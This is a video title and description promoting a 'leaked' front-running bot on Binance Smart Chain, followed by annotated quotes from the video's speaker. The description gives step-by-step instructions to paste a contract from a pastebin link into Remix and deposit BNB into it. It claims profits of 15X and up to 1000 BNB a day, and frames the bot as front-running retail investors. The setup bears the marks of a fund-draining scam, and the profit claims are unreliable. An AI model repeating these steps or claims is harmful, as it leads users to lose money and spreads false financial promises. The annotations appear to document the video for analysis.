title: Front Run Bot LEAKED - Create and Deploy a Front Run Bot on BSC and Earn BNB Profits!
description: ...THIS VIDEO IS FOR EDUCATION PURPOSES ONLY Expand below to see instructions  A $ 15,000 BSC FrontRun BOT was finally leaked and we will teach you how to build it! In the following steps, we'll show you a simple front run deployment in Solidity which automatically locates any liquidity to a BSC token and immediately transacts before other users. Sell automatically triggers at profit, as well if a tokens liquidity is fully called into your wallet. NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix  UPDATE: One disclaimer I may have missed is to recommend minimum 0.2BNB.   I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower. Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.2BNB. Most tokens these days have some burn. Less than 0.2BNB doesn't give you much to work with.  So in order for the bot to work properly, I recommend you to fund at least 0.2. If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more  1)Download metamask: https://metamask.io/download.html  2)Connect MetaMask to Binance Smart Chain: https://academy.binance.com/en/articl...  3)Go to Remix: https://remix.ethereum.org/  4)Click on "contracts" folder and then "Create New File". Rename it as you like  5)Paste SmartContract in Remix: https://pastebin.pl/view/raw/0f567af1 (Copy and Paste as it is)  6)Compile it and copy contract address  7)Deposit funds to the Frontrun contract  8)Start the bot with "Action" button  Happy front-running!

evidence.observation: The description instructs viewers to deposit funds into the front-running contract.
evidence.quote: Deposit funds to the Frontrun contract

evidence.observation: The speaker describes sending funds to the contract created in the demonstration.
evidence.quote: send some funds to that contract

evidence.observation: The speaker links sending funds to the contract with pressing an action button to activate it.
evidence.quote: Next thing that we do after it's sent to the contract is we will just go over here and press the action button.

evidence.observation: The speaker describes an automated buy-and-sell process occurring within one minute.
evidence.quote: you basically just do an automated buy sells within one minute

evidence.observation: The speaker explicitly describes the mechanism as front-running retail investors.
evidence.quote: so that way it will front run all the retail uh investors that come in

evidence.observation: The speaker claims that 90% of the proceeds will automatically transfer back to the wallet.
evidence.quote: And then from there, it will take 90% will automatically trans back to your wallet.

evidence.observation: The speaker reports an approximately 15X result in the described demonstration.
evidence.quote: there we go yeah it's already around 15 X

evidence.observation: The speaker claims that using a larger starting amount could produce upwards of 1000 BNB per day.
evidence.quote: you could have upwards of 1000 BNB day if you use a larger amount than I started with.

evidence.observation: The speaker states that the demonstration will use 0.2 BNB and then says they may use .4 BNB.
evidence.quote: For sake of this video. I will do 0.2 BNB. Might as well make it .4 a little bit extra

evidence.observation: The speaker states that the transaction was confirmed and sent to the contract.
evidence.quote: so the transaction is confirmed. So it was sent to the contract.
